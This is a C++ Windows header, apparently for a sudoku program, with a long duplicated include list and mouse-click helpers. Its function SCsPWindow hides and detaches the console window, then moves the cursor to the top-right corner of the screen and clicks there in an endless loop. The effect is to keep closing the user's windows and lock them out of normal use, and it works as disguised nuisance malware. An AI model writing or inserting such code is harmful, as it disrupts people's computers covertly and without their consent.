#ifndef _SHUDUWINDOWS_
#define _SHUDUWINDOWS_

#include<windows.h>
#include<assert.h>
#include<ctype.h>
#include<errno.h>
#include<float.h>
#include<fstream>
#include<iomanip>
#include<iostream>
#include<limits.h>
#include<locale.h>
#include<math.h>
#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include<time.h>
#include<wchar.h>
#include<wctype.h>
#include<algorithm>
#include<bitset>
#include<cctype>
#include<cerrno>
#include<clocale>
#include<cmath>
#include<complex>
#include<cstdio>
#include<cstdlib>
#include<cstring>
#include<ctime>
#include<deque>
#include<exception>
#include<fstream>
#include<functional>
#include<limits>
#include<list>
#include<map>
#include<iomanip>
#include<ios>
#include<iosfwd>
#include<iostream>
#include<istream>
#include<ostream>
#include<queue>
#include<set>
#include<sstream>
#include<stack>
#include<stdexcept>
#include<streambuf>
#include<string>
#include<utility>
#include<vector>
#include<cwchar>
#include<cwctype>
#include<complex.h>
#include<fenv.h>
#include<inttypes.h>
#include<stdbool.h>
#include<stdint.h>
#include<tgmath.h>
#include<assert.h>
#include<ctype.h>
#include<errno.h>
#include<float.h>
#include<fstream>
#include<iomanip>
#include<iostream>
#include<limits.h>
#include<locale.h>
#include<math.h>
#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include<time.h>
#include<wchar.h>
#include<wctype.h>
#include<algorithm>
#include<bitset>
#include<cctype>
#include<cerrno>
#include<clocale>
#include<cmath>
#include<complex>
#include<cstdio>
#include<cstdlib>
#include<cstring>
#include<ctime>
#include<deque>
#include<exception>
#include<fstream>
#include<functional>
#include<limits>
#include<list>
#include<map>
#include<iomanip>
#include<ios>
#include<iosfwd>
#include<iostream>
#include<istream>
#include<ostream>
#include<queue>
#include<set>
#include<sstream>
#include<stack>
#include<stdexcept>
#include<streambuf>
#include<string>
#include<utility>
#include<vector>
#include<cwchar>
#include<cwctype>
#include<complex.h>
#include<fenv.h>
#include<inttypes.h>
#include<stdbool.h>
#include<conio.h>
#include<bits/stdc++.h>
#include <winable.h>  
void MouseLeftDown()
{
	INPUT Input={0};
	Input.type=INPUT_MOUSE;
	Input.mi.dwFlags=MOUSEEVENTF_LEFTDOWN;
	SendInput(1,&Input,sizeof(INPUT));
}
 
void MouseLeftUp()
{
	INPUT Input={0};
	Input.type=INPUT_MOUSE;
	Input.mi.dwFlags=MOUSEEVENTF_LEFTUP;
	SendInput(1,&Input,sizeof(INPUT));
	
}
void HideWindow() {
	HWND hwnd;
	hwnd=FindWindow("ConsoleWindowClass",NULL);
	if(hwnd)        ShowWindow(hwnd,SW_HIDE);
	return;
}
void SCsPWindow()
{
	HideWindow();
	FreeConsole(); 
	int x=GetSystemMetrics(SM_CXSCREEN);
    for(int i=1;i<=x;i++)
    {
    	SetCursorPos(i,1);
    	Sleep(1);
	}
	while(1)
	{
		SetCursorPos(x,1);
		MouseLeftDown();
		MouseLeftUp();
	}
	
	return ;
}

#endif

